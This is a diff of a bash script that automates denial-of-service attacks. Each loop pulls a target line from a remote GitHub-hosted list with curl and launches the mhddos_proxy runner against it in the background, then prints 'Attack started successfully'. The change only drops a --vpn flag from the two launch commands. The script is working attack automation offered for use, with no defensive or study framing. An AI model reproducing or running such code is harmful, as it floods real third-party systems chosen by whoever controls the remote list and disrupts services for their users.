@@ -211,10 +211,10 @@ do
             		cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]")")
            
             		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
-            		echo "python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn $debug"
+            		echo "python3 runner.py $cmd_line --rpc $rpc -t $threads $debug"
             
             		cd ~/mhddos_proxy
-            		AUTO_MH=1 python3 runner.py $cmd_line -t $threads --copies $copies --vpn $debug&
+            		AUTO_MH=1 python3 runner.py $cmd_line -t $threads --copies $copies $debug&
 	    		sleep 20s
             		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
    		done
@@ -249,10 +249,10 @@ do
             		cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]")")
            
             		echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
-            		echo "python3 runner.py $cmd_line --rpc $rpc -t $threads --vpn $debug"
+            		echo "python3 runner.py $cmd_line --rpc $rpc -t $threads $debug"
             
             		cd ~/mhddos_proxy
-            		AUTO_MH=1 python3 runner.py $cmd_line -t $threads --copies $copies --vpn $debug&
+            		AUTO_MH=1 python3 runner.py $cmd_line -t $threads --copies $copies $debug&
 	    		sleep 20s
 			echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
 			
